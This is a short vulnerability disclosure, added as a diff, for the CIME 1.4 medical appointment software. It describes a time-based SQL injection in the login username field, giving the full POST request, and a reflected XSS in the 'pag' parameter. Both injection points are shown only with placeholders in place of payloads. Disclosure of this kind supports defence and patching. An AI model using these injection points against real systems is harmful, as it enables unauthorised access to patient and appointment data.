@@ -1,0 +1,36 @@
+# Exploit Title: Control de Citas 1.4 (CIME) - Multiple Vulnerabilities
+# Date: 01/02/2014
+# Exploit Author: vinicius777
+# Contact: vinicius777 [AT] gmail / @vinicius777_
+# Vendor Homepage: http://www.cgaredes.tk/
+# Software Link: http://sourceforge.net/projects/cime/files/latest/download?source=directory
+
+ 
+[1] SQL Injection - 'USERNAME' vulnerable to time based attack
+
+P0C: POST REQUEST 
+
+POST /cime/citasmedicas.php?pag=citasmedindex HTTP/1.1
+Host: localhost
+User-Agent: Mozilla/5.0 (X11; Linux i686; rv:22.0) Gecko/20100101 Firefox/22.0 Iceweasel/22.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://localhost/cime/citasmedicas.php?pag=citasmedindex
+Cookie: PHPSESSID=ftkms6mdqi3039r41felgm39s1; 
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 27
+
+username=[SQL INJECTION]&password=pass
+
+
+[2] XSS Reflected on citasmedicas.php (must be logged)
+
+P0C = http://localhost/cime/citasmedicas.php?pag=[XSS]
+
+
+
+##
+
+
